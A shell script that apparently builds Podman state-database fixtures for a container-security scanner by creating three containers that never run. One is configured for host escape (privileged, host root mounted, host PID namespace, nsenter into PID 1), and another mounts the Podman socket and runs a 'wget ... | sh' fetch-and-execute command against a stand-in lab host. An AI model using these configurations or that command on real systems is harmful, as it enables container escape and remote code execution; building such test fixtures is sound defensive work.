#!/bin/sh
# How db.sql and bolt_state.db here were made: Podman itself creating three containers that never
# run, then its state database copied out. Run from this folder, once per version:
#   docker run --rm --cap-add SYS_ADMIN --cap-add SYS_PTRACE --security-opt apparmor=unconfined \
#     --security-opt seccomp=unconfined --device /dev/fuse -v "$PWD:/out" \
#     quay.io/podman/stable:v5.2.5 sh /out/make-podman-state.sh                 # db.sql (SQLite)
#   ... quay.io/podman/stable:v4.9.3 sh /out/make-podman-state.sh boltdb      # bolt_state.db
# (Podman caps what it grants at its own capability set, hence SYS_PTRACE on the outer container;
# the image's containers.conf shares the host's network, IPC and UTS, hence the private ones below.)
#   lab-escape   privileged, / bind-mounted read-write, the host's PID namespace, nsenter
#   lab-web      nothing it shouldn't have
#   lab-sock     Podman's API socket mounted, host network, SYS_PTRACE, wget | sh
set -eu
mkdir -p /run/podman && touch /run/podman/podman.sock
P="podman --db-backend ${1:-sqlite} --storage-driver vfs --cgroup-manager cgroupfs --events-backend none"
$P pull -q docker.io/library/alpine:3.20 >/dev/null
$P create --name lab-escape --cgroups enabled --network none --ipc private --uts private --privileged \
  -v /:/host --pid host docker.io/library/alpine:3.20 sh -c "nsenter -t 1 -m -u -i -n sh" >/dev/null
$P create --name lab-web --network none --ipc private --uts private docker.io/library/alpine:3.20 sleep 3600 >/dev/null
$P create --name lab-sock -v /run/podman/podman.sock:/run/podman/podman.sock --cap-add SYS_PTRACE --network host \
  --ipc private --uts private docker.io/library/alpine:3.20 sh -c "wget -qO- http://update.rivendell-lab.test/agent | sh" >/dev/null
for f in /var/lib/containers/storage/libpod/bolt_state.db /var/lib/containers/storage/db.sql; do
  [ -f "$f" ] && cp "$f" /out/
done
